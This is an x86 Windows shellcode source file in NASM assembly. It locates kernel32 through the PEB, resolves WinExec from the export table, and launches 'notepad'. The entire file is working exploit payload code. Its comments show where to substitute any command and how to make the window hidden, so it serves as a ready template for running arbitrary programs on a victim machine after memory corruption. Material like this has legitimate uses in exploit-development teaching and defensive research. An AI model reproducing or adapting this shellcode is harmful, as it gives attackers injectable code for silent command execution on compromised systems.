; Filename: winexec.asm
; Author: Daniel Sauder
; Website: http://govolution.wordpress.com/
; License: http://creativecommons.org/licenses/by-sa/3.0/

BITS 32

global _start

_start:

xor ebx, ebx

;Find Kernel32 Base
mov edi, [fs:ebx+0x30]
mov edi, [edi+0x0c]
mov edi, [edi+0x1c]

module_loop:
mov eax, [edi+0x08]
mov esi, [edi+0x20]
mov edi, [edi]
cmp byte [esi+12], '3'
jne module_loop

; Kernel32 PE Header
mov edi, eax
add edi, [eax+0x3c]

; Kernel32 Export Directory Table
mov edx, [edi+0x78]
add edx, eax

; Kernel32 Name Pointers
mov edi, [edx+0x20]
add edi, eax

; Find WinExec
mov ebp, ebx
name_loop:
mov esi, [edi+ebp*4]
add esi, eax
inc ebp
cmp dword [esi],   0x456e6957 ;WinE
jne name_loop

; WinExec Ordinal
mov edi, [edx+0x24]
add edi, eax
mov bp, [edi+ebp*2]

; WinExec Address
mov edi, [edx+0x1C]
add edi, eax
mov edi, [edi+(ebp-1)*4] ;subtract ordinal base
add edi, eax

; Zero Memory
mov ecx, ebx
mov cl, 0xFF
zero_loop:
push ebx
loop zero_loop

; push payload here (notepad)
push 0x20646170
push 0x65746F6E

mov edx, esp

; call WinExec
inc ecx  ; ecx=1 show window, 0=hidden (simply comment out for that)
push ecx ; window mode
push edx ; command
call edi
